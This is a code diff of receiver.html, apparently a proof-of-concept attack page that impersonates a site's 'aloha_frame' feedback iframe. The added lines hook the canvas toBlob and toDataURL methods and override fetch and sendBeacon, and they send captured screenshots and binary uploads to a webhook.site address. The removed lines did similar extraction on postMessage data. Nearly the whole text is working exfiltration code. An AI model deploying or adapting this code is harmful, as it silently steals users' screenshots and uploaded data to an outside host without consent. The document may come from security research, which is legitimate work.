@@ -3,82 +3,65 @@
   <body>
     <h2>receiver.html loaded</h2>
     <script>
-      window.name = "aloha_frame"; // Impersonate legitimate feedback iframe
+      window.name = "aloha_frame";
       const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322";
 
-      function deepFindScreenshot(obj) {
-        const str = JSON.stringify(obj);
-        const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
-        const blob = str.match(/blob:https:\/\/[a-z0-9.-]+\/[a-z0-9\-]+/i);
-        return base64 ? base64[0] : (blob ? blob[0] : null);
-      }
+      // 🟥 Inject visual marker
+      document.body.style.background = "red";
+      document.body.style.color = "white";
+      document.body.innerHTML += "<h3>🟥 RED BACKGROUND INJECTED</h3>";
 
-      async function displayBlob(data, color = "black") {
-        const url = URL.createObjectURL(data);
-        const img = new Image();
-        img.src = url;
-        img.style = `max-width:100%;border:3px solid ${color}`;
-        document.body.appendChild(img);
-      }
+      // 🎯 Hook canvas methods
+      const originalToBlob = HTMLCanvasElement.prototype.toBlob;
+      const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
+      const originalGetContext = HTMLCanvasElement.prototype.getContext;
 
-      // 🧲 Hook fetch
+      HTMLCanvasElement.prototype.toBlob = function(callback, ...args) {
+        console.log("🧪 canvas.toBlob() triggered");
+        return originalToBlob.call(this, (...cbArgs) => {
+          navigator.sendBeacon(webhookURL, cbArgs[0]);
+          callback(...cbArgs);
+        }, ...args);
+      };
+
+      HTMLCanvasElement.prototype.toDataURL = function(...args) {
+        const result = originalToDataURL.apply(this, args);
+        console.log("🧪 canvas.toDataURL() = ", result.slice(0, 100));
+        fetch(webhookURL, {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify({ dataURL: result.slice(0, 300) })
+        });
+        return result;
+      };
+
+      HTMLCanvasElement.prototype.getContext = function(type, ...args) {
+        console.log("🧪 getContext:", type);
+        return originalGetContext.call(this, type, ...args);
+      };
+
+      // 🧲 Existing intercepts
       const _fetch = window.fetch;
       window.fetch = async (...args) => {
         const [url, opts] = args;
         let body = opts?.body;
-
         if (body instanceof Blob || body instanceof ArrayBuffer) {
           console.log("📦 Intercepted fetch() binary upload:", url);
-          displayBlob(body, "purple");
           navigator.sendBeacon(webhookURL, body);
-        } else if (body && typeof body === "object") {
-          console.log("📦 Intercepted fetch() object upload:", url);
-          navigator.sendBeacon(webhookURL, JSON.stringify(body));
         }
         return _fetch(...args);
       };
 
-      // 🧲 Hook sendBeacon
       const _sendBeacon = navigator.sendBeacon;
       navigator.sendBeacon = (url, data) => {
         console.log("📡 Intercepted sendBeacon:", url, data);
-        if (data instanceof Blob || data instanceof ArrayBuffer) {
-          displayBlob(data, "orange");
-        }
-        _sendBeacon(webhookURL, data);
         return _sendBeacon(url, data);
       };
 
+      // 🔁 postMessage listener
       window.addEventListener("message", async (e) => {
-        try {
-          console.log("📩 postMessage from:", e.origin);
-          console.log("🧾 Raw data:", e.data);
-
-          if (e.data instanceof Blob || e.data instanceof ArrayBuffer) {
-            displayBlob(e.data, "blue");
-          } else if (typeof e.data === "object") {
-            const found = deepFindScreenshot(e.data);
-            if (found) {
-              const img = new Image();
-              img.src = found;
-              img.style = "max-width:100%;border:3px solid red";
-              document.body.appendChild(img);
-            }
-          }
-
-          fetch(webhookURL, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify({
-              origin: e.origin,
-              type: Object.prototype.toString.call(e.data),
-              containsScreenshot: !!deepFindScreenshot(e.data),
-              timestamp: new Date().toISOString()
-            })
-          });
-        } catch (err) {
-          console.error("❌ Error in message handler:", err);
-        }
+        console.log("📩 postMessage from:", e.origin);
+        console.log("🧾 Raw data:", e.data);
       });
 
       console.log("✅ receiver.html active and impersonating aloha_frame");
